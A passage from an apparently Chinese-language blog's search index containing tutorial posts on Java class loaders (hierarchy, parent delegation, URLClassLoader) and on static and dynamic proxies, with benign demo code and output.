class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取系统类加载器（默认加载用户类路径的类）</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">appLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br></pre></td></tr></table></figure></li><li><p><strong>自定义类加载器</strong></p><p>通过继承<code>ClassLoader</code>并重写方法，主要用于热部署、模块隔离、加密加载</p></li></ul><p><strong>类加载器的层级关系</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Bootstrap ClassLoader（启动类加载器，C++实现）</span><br><span class="line">       ↑</span><br><span class="line">Extension ClassLoader（扩展类加载器，Java实现）</span><br><span class="line">       ↑</span><br><span class="line">Application ClassLoader（应用程序类加载器，Java实现）</span><br><span class="line">       ↑</span><br><span class="line">Custom ClassLoader（自定义类加载器，Java实现）</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取系统类加载器（Application ClassLoader）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">appLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;系统类加载器: &quot;</span> + appLoader); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取其父加载器（Extension ClassLoader）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">extLoader</span> <span class="operator">=</span> appLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;扩展类加载器: &quot;</span> + extLoader); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试获取扩展类加载器的父加载器（Bootstrap ClassLoader，返回null）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">bootstrapLoader</span> <span class="operator">=</span> extLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;启动类加载器: &quot;</span> + bootstrapLoader); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">系统类加载器: sun.misc.Launcher$AppClassLoader@4e0e2f2a</span><br><span class="line">扩展类加载器: sun.misc.Launcher$ExtClassLoader@1540e19d</span><br><span class="line">启动类加载器: null</span><br></pre></td></tr></table></figure><h3 id="类加载器的核心方法"><a href="#类加载器的核心方法" class="headerlink" title="类加载器的核心方法"></a>类加载器的核心方法</h3><p>对应<code>ClassLoader</code>对象</p><ul><li><p><code>loadClass(String name)</code>: 加载指定的Java类</p></li><li><p><code>findClass(String name)</code>: 查找指定的Java类</p></li><li><p><code>findLoadedClass(String name)</code>: 查找JVM已经加载过的类</p></li><li><p><code>defineClass(String name, byte[] b, int off, int len)</code>: 定义一个Java类</p><p>将字节数组转换为JVM内部的<code>Class</code>对象，是类加载的核心步骤。注意此方法为final方法，不可重写</p></li><li><p><code>resolveClass(Class&lt;?&gt; c)</code>: 链接指定的Java类，包括<code>验证、准备、解析</code>三个阶段</p></li></ul><h2 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h2><p>JVM并不是在启动时就把<code>.class</code>文件都加载了一遍，而是在执行过程中用到了这个类才去加载</p><p>如果一个类加载器收到了类加载的请求，他首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的类加载器也是如此，因此<strong>所有的加载请求都应该被传送到顶层的启动类加载器中</strong>，当<strong>最顶层的启动类加载器无法加载该类时，再一层一层向下委派给子类加载器</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//每个类加载器都有个父加载器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader parent;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) &#123;</span><br><span class="line">  </span><br><span class="line">        <span class="comment">//查找一下这个类是不是已经加载过了</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果没有加载过</span></span><br><span class="line">        <span class="keyword">if</span>( c == <span class="literal">null</span> )&#123;</span><br><span class="line">          <span class="comment">//先委派给父加载器去加载，注意这是个递归调用</span></span><br><span class="line">          <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">              c = parent.loadClass(name);</span><br><span class="line">          &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// 如果父加载器为空，查找Bootstrap加载器是不是加载过了</span></span><br><span class="line">              c = findBootstrapClassOrNull(name);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果父加载器没加载成功，调用自己的findClass去加载</span></span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            c = findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> c；</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name)&#123;</span><br><span class="line">       <span class="comment">//1. 根据传入的类名name，到在特定目录下去寻找类文件，把.class文件读入内存</span></span><br><span class="line">          ...</span><br><span class="line">          </span><br><span class="line">       <span class="comment">//2. 调用defineClass将字节数组转成Class对象</span></span><br><span class="line">       <span class="keyword">return</span> defineClass(buf, off, len)；</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将字节码数组解析成一个Class对象，用native方法实现</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)&#123;</span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类加载的方式"><a href="#类加载的方式" class="headerlink" title="类加载的方式"></a>类加载的方式</h2><ul><li><strong>命令行启动应用时候JVM初始化加载</strong></li><li><strong>通过<code>Class.forName</code>方法动态加载</strong></li><li><strong>通过<code>ClassLoader.loadClass()</code>方法动态加载</strong></li></ul><p>通过<code>Class.forName</code>方法动态执行类中的static静态代码块，而<code>ClassLoader.loadClass()</code>方法动态加载不会执行</p><h2 id="类加载过程实践"><a href="#类加载过程实践" class="headerlink" title="类加载过程实践"></a>类加载过程实践</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        cl.loadClass(<span class="string">&quot;nivia&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">nivia</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们创建了个java文件，当我们运行时，首先javac会将文件编译转换为JVM可识别的字节码文件，生成.class文件，内容为二进制字节码。然后JVM进行类加载机制：</p><p><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/QQ20250402-201851.png"></p><p>可以看到，获取到的是APPClassLoader加载器</p><p><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/QQ20250402-202101.png"></p><p>然后执行<code>ClassLoader.loadClass</code>方法。这里由于<code>AppClassLoader</code>类没有<code>loadClass(string name)</code>方法，于是调用父类的<code>ClassLoader.loadClass</code>方法。</p><p>然后调用<code>loadClass(String var1, boolean var2)</code>方法:<br><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/QQ20250402-212651.png"></p><p>最后会调用父类的<code>loadClass(String name, boolean resolve)</code>方法:</p><p><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/QQ20250402-213226.png" alt="QQ20250402-213226"></p><p>在父类的<code>loadClass(String name, boolean resolve)</code>方法中：</p><p><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/QQ20250402-202817-17436008073416.png" alt="QQ20250402-202817"></p><p>这里判断父类加载器是否加载过这个类，如果没有会调用父类加载器的<code>loadClass</code>方法进行Java，反之自己加载</p><p>可以看到父类加载器为<code>ExtClassLoader</code></p><p>最后执行到<code>URLClassLoader.findClass</code>⽅法:</p><p><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/QQ20250402-224441.png"></p><p>随后调用<code>SecureClassLoader.defineClass(name, b, off, len, getProtectionDomain(cs));</code></p><p><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/QQ20250402-224736.png"></p><p>最后是调⽤了这个<code>ClassLoader.defineClass1</code>⽅法:</p><p><img src="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/QQ20250402-224844.png"></p><p>总结：</p><ol><li>类的继承关系(左⼦类右⽗类)：<code>AppClassLoader → URLClassLoader → SecureClassLoader → ClassLoader</code></li><li>类加载时的⽅法调⽤：<code>loadClass → findClass → defineClass</code></li><li>findClass是判断该路径下能否加载该类，defineClass是通过字节码加载类</li></ol><p>在调试过程遇到的一个类加载器<code>URLClassLoader</code>，它可以加载本地和远程的class文件:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlclassloader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///Users/nivia/Desktop/Java/src&quot;</span>)&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> urlclassloader.loadClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;nivia&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出nivia，说明成功加载到本地的class文件</p><h2 id="利用加载器获取Class对象"><a href="#利用加载器获取Class对象" class="headerlink" title="利用加载器获取Class对象"></a>利用加载器获取Class对象</h2><p>ClassLoader类下存在一个静态方法<code>getSystemClassLoader()</code>，可以获取到<code>AppClassLoader</code>应用程序加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(ClassLoader.getSystemClassLoader()); </span><br><span class="line"><span class="comment">//sun.misc.Launcher$AppClassLoader@18b4aac2</span></span><br></pre></td></tr></table></figure><p>可利用获取到的<code>AppClassLoader</code>应用程序加载器，来加载一个类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/czwbig/p/11127222.html">https://www.cnblogs.com/czwbig/p/11127222.html</a></p><p><a href="https://www.cnblogs.com/happy-coding/p/18692970#%E7%AE%80%E4%BB%8B">https://www.cnblogs.com/happy-coding/p/18692970#%E7%AE%80%E4%BB%8B</a></p><p><a href="https://javabetter.cn/jvm/class-load.html">https://javabetter.cn/jvm/class-load.html</a></p><p><a href="https://nivi4.notion.site/Java-cedccc0611654bd99f841de3ef578e24?pvs=97#c713bd160a704c2ebc8e917484959e98">https://nivi4.notion.site/Java-cedccc0611654bd99f841de3ef578e24?pvs=97#c713bd160a704c2ebc8e917484959e98</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java动态代理</title>
      <link href="/2025/03/31/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
      <url>/2025/03/31/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>代理模式是Java中常用的设计模式。</p><p>其特征是代理类与委托类有<strong>同样的接口</strong>，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。</p><p>代理类与委托类之间通常会存在关联关系，一个代理类的对象与一个委托类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用委托类的对象的相关方法来提供简单的服务。简单的说就是，我们在访问实际对象时，是<strong>通过代理对象</strong>来访问的，代理模式就是在访问实际对象时引入一定程度的间接性，因为这种间接性，可以附加多种用途。</p><p><img src="/2025/03/31/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/Untitled.webp"></p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>指在编译时接口，代理类，被代理类等就已经确定下来了，在程序运行之前，代理类的.class文件就已经生成。</p><p>需要代理类与委托类有相同的接口</p><p>缺点：当需要代理的对象过多就需要实现大量的代理类，并且当接口增加方法，目标对象与代理对象都要进行修改</p><p>Demo:</p><p>拿学生交作业举例，一般都是学生交给课代表，课代表交给老师这种模式。此时学生就相当于委托类，课代表相当于一个学生代理类。</p><p>这里需要一个公共的接口，即学生（委托类）和课代表（代理类）的公共接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Event</span>&#123; </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">SubmitWork</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写一个学生类（委托类），实现公共代理接口和重写接口中的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String m)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=m;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SubmitWork</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name+<span class="string">&quot;提交作业&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可理解为这个类实现学生将作业交给课代表，即从委托类到代理类。</p><p>同时编写一个代理类，即课代表，实现从代理类到目标对象，同样需要公共代理接口和重写接口中的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentInnovation</span> <span class="keyword">implements</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    Student student;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>; <span class="comment">//收到的作业数量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">StudentInnovation</span><span class="params">(Student stu)</span>&#123;</span><br><span class="line">        <span class="comment">//只代理学生对象</span></span><br><span class="line">        <span class="keyword">if</span>(stu.getClass()==Student.class)&#123;</span><br><span class="line">            <span class="built_in">this</span>.student=stu;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用于动态切换代理对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStudent</span><span class="params">(Student student)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.student=student;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SubmitWork</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.student.SubmitWork();</span><br><span class="line">        count+=<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已收作业数:&quot;</span>+count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//被代理的学生张三，他的作业提交由代理对象monitor（课代表）完成</span></span><br><span class="line">        Student s1=<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        Student s2=<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        Student s3=<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;王五&quot;</span>);</span><br><span class="line">        <span class="comment">//生成代理对象，并将张三传给代理对象</span></span><br><span class="line">        StudentInnovation monitor=<span class="keyword">new</span> <span class="title class_">StudentInnovation</span>(s1);</span><br><span class="line">        <span class="comment">//向课代表交作业</span></span><br><span class="line">        monitor.SubmitWork();</span><br><span class="line">        monitor.setStudent(s2);  <span class="comment">//切换代理对象</span></span><br><span class="line">        monitor.SubmitWork();</span><br><span class="line">        monitor.setStudent(s3);</span><br><span class="line">        monitor.SubmitWork();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">张三提交作业</span><br><span class="line">已收作业数:1</span><br><span class="line">李四提交作业</span><br><span class="line">已收作业数:2</span><br><span class="line">王五提交作业</span><br><span class="line">已收作业数:3</span><br></pre></td></tr></table></figure><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>与静态代理原理相同，需要公共接口，委托类和代理类。区别就是<strong>动态代理是利用反射机制在运行时创建代理类</strong>。</p><p>主要<strong>通过<code>Java.lang.reflect.Proxy</code>类与<code>InvocationHandler</code>接口</strong></p><p><code>InvocationHandler</code>接口：负责提供调用代理的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其中proxy为动态生成的代理对象(不是被代理的实际对象)</p><p>method表示调用的方法名(通过反射获取的Method对象)</p><p>args为调用方法的参数数组</p></blockquote><p><code>Proxy</code>类：负责动态构建代理类</p><p>该类提供了一个静态方法用于得到代理对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler handler)</span></span><br></pre></td></tr></table></figure><blockquote><p>loader表示类加载器(通常使用目标接口的类加载器，用于加载动态生成的代理类)</p><p>第二个参数指代理类要实现的接口列表</p><p>第三个参数指方法调用的处理器</p></blockquote><p>Demo:</p><p>委托类和公共接口不用修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Event</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">SubmitWork</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    </span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String n)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SubmitWork</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name + <span class="string">&quot;提交作业&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写动态获取代理类的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>; <span class="comment">//收到的作业数量</span></span><br><span class="line">    <span class="comment">//动态切换被代理对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStudent</span><span class="params">(Student student)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.object=student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置需要代理的对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProxyHandler</span><span class="params">(Object object)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.object=object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        method.invoke(object,args);</span><br><span class="line">        <span class="built_in">this</span>.count+=<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已收作业数量:&quot;</span>+<span class="built_in">this</span>.count);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        method.invoke(object,args);</span><br><span class="line">        <span 